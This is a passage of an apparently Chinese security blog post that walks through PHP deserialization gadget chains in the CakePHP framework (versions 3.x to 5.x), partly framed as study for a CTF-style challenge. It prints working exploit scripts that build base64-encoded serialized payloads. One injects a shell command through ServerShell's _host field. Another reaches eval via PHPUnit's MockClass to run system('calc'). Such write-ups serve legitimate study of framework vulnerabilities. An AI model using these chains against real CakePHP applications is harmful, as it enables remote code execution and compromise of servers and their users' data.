+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">out</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$newlines</span> = <span class="number">1</span>, <span class="variable">$level</span> = <span class="built_in">self</span>::<span class="variable constant_">NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$level</span> &lt;= <span class="variable language_">$this</span>-&gt;_level) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_lastWritten = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;_out-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$message</span>, <span class="variable">$newlines</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_lastWritten;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>参数可控，$this-&gt;_level&lt;1即可<br>至此可以执行系统命令<br>当然现在关键在于如何书写exp<br>先把架子搭好，注意哪些值需要我们控制，哪些值有连锁反应需要特殊构造，注意哪些抽象类找到它们的子类（基于源代码去找），这种也是一种能力吧，需要锻炼<br>但总归学习一遍链子也是一种熟悉，再次碰到这种框架的反序列化问题就不会一头雾水了，分析一下大佬的链子<br>exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">Core</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectRegistry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_loaded</span> = [];<span class="comment">//联动控值</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">ORM</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Table</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_behaviors</span>;<span class="comment">//-&gt;vendor\cakephp\cakephp\src\ORM\BehaviorRegistry.php</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">ObjectRegistry</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BehaviorRegistry</span> <span class="keyword">extends</span> <span class="title">ObjectRegistry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_methodMap</span> = [];<span class="comment">//与_loaded联动</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">Console</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_io</span>;<span class="comment">//-&gt;ConsoleIo</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConsoleIo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_level</span>;<span class="comment">//可控值=0即可</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">Shell</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Console</span>\<span class="title">Shell</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServerShell</span> <span class="keyword">extends</span> <span class="title">Shell</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_host</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_port</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_documentRoot</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_iniPath</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Process</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Table</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Process</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$processPipes</span>;<span class="comment">//-&gt;vendor\cakephp\cakephp\src\ORM\Table.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pop</span> = <span class="keyword">new</span> <span class="title class_">Process</span>([]);</span><br><span class="line"><span class="variable">$pop</span>-&gt;status = <span class="string">&quot;started&quot;</span>;</span><br><span class="line"><span class="variable">$pop</span>-&gt;processPipes = <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;processPipes-&gt;_behaviors = <span class="keyword">new</span> <span class="title class_">\Cake</span>\ORM\<span class="title function_ invoke__">BehaviorRegistry</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;processPipes-&gt;_behaviors-&gt;_methodMap = [<span class="string">&quot;readandwrite&quot;</span>=&gt;[<span class="string">&quot;servershell&quot;</span>,<span class="string">&quot;main&quot;</span>]];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">\Cake\Shell\ServerShell</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;_io = <span class="keyword">new</span> <span class="title class_">\Cake\Console\ConsoleIo</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;_io-&gt;_level = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;_host = <span class="string">&quot;;open /System/Applications/Calculator.app;&quot;</span>;</span><br><span class="line"><span class="variable">$pop</span>-&gt;processPipes-&gt;_behaviors-&gt;_loaded = [<span class="string">&quot;servershell&quot;</span>=&gt;<span class="variable">$a</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));</span><br></pre></td></tr></table></figure></div>
+<p>这样成功弹计算器了<br>有时候源码里已经有引用了，比如A类里引用了B类，可以直接把B类里的属性写在A类里</p>
+<h2 id="cakephp-v4-x"><a href="#cakephp-v4-x" class="headerlink" title="cakephp[v4.x]"></a>cakephp[v4.x]</h2><p>该链ServerShell改动，因此寻找新的RCE点<br>即找到新的方法RCE，我们有回调函数可以接上<br><code>vendor\cakephp\cakephp\src\Database\Statement\CallbackStatement.php</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$type</span> = <span class="built_in">parent</span>::<span class="variable constant_">FETCH_TYPE_NUM</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$callback</span> = <span class="variable language_">$this</span>-&gt;_callback;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable language_">$this</span>-&gt;_statement-&gt;<span class="title function_ invoke__">fetch</span>(<span class="variable">$type</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$row</span> === <span class="literal">false</span> ? <span class="variable">$row</span> : <span class="variable">$callback</span>(<span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>存在任意函数执行<br><code>$callback</code>参数可控<br><code>$this-&gt;_statement</code>来自<code>vendor/cakephp/cakephp/src/Database/Statement/StatementDecorator.php</code><br>跟进需要找到一个类里面有fetch方法返回可控的row值<br><code>vendor\cakephp\cakephp\src\Database\Statement\BufferedStatement.php</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">FETCH_TYPE_NUM</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_allFetched) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;buffer[<span class="variable language_">$this</span>-&gt;index])) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable language_">$this</span>-&gt;buffer[<span class="variable language_">$this</span>-&gt;index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;index += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span> &amp;&amp; <span class="variable">$type</span> === <span class="built_in">static</span>::<span class="variable constant_">FETCH_TYPE_NUM</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">array_values</span>(<span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$row</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>_allFetched,buffer,index参数可，即可控$row值<br>exp稍有改动，问题不大<br>对于一个新版本可以看哪些旧版本的部分链子没有改动可以利用，再看看入口方法，再用seay扫一扫，然后本地一边搭一边调试 </p>
+<h2 id="cakephp-v5-x"><a href="#cakephp-v5-x" class="headerlink" title="cakephp[v5.x]"></a>cakephp[v5.x]</h2><p>以一道pop题学习吧  </p>
+<p>还是找到老地方Process.php<br>但是发现在这个版本新增了一个__wakeup方法，直接抛出错误，只能寻找新的入口类了<br>发现终点类是MockClass里的generate方法-&gt;eval()<br>关键就是找到入口类触发Table类里的__call方法?<br>找到一个析构函数<br><code>React\Promise\InternalRejectedPromise::__destruct</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handled) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$handler</span> = <span class="title function_ invoke__">set_rejection_handler</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$handler</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Unhandled promise rejection with &#x27;</span> . <span class="variable language_">$this</span>-&gt;reason;</span><br><span class="line"></span><br><span class="line">        \<span class="title function_ invoke__">error_log</span>(<span class="variable">$message</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$handler</span>(<span class="variable language_">$this</span>-&gt;reason);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        \<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([^:\s]++)(.*+)$/sm&#x27;</span>, (<span class="keyword">string</span>) <span class="variable">$e</span>, <span class="variable">$match</span>);</span><br><span class="line">        \<span class="title function_ invoke__">assert</span>(<span class="keyword">isset</span>(<span class="variable">$match</span>[<span class="number">1</span>], <span class="variable">$match</span>[<span class="number">2</span>]));</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Fatal error: Uncaught &#x27;</span> . <span class="variable">$match</span>[<span class="number">1</span>] . <span class="string">&#x27; from unhandled promise rejection handler&#x27;</span> . <span class="variable">$match</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        \<span class="title function_ invoke__">error_log</span>(<span class="variable">$message</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">255</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>进行了字符拼接，可以触发toString方法<br><code>Cake\Http\Response</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">rewind</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">getContents</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以调用__call方法，至此完成闭合，开始写payload<br>exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPUnit</span>\<span class="title class_">Framework</span>\<span class="title class_">MockObject</span>\<span class="title class_">Generator</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mockName = <span class="string">&quot;PHPUnit\\Framework\\MockObject\\Generator\\MockMethodSet&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;classCode = <span class="string">&quot;system(&#x27;calc&#x27;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">ORM</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Generator</span>\<span class="title">MockClass</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BehaviorRegistry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_loaded = [<span class="string">&quot;1&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">MockClass</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_methodMap = [<span class="string">&quot;rewind&quot;</span>=&gt;[<span class="string">&quot;1&quot;</span>,<span class="string">&quot;generate&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">ORM</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">BehaviorRegistry</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Table</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_behaviors = <span class="keyword">new</span> <span class="title class_">BehaviorRegistry</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">Http</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Table</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stream = <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">React</span>\<span class="title class_">Promise</span>\<span class="title class_">Internal</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RejectedPromise</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;reason = <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">RejectedPromise</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>));</span><br></pre></td></tr></table></figure></div>
+<p>ending~<br>没啥巧，多做框架的链子就行()</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cakephp-v3-x"><span class="toc-number">2.</span> <span class="toc-text">cakephp[v3.x]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cakephp-v4-x"><span class="toc-number">3.</span> <span class="toc-text">cakephp[v4.x]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cakephp-v5-x"><span class="toc-number">4.</span> <span class="toc-text">cakephp[v5.x]</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=记cakephp框架反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=记cakephp框架反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记cakephp框架反序列化&body=Check out this article: https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=记cakephp框架反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=记cakephp框架反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=记cakephp框架反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
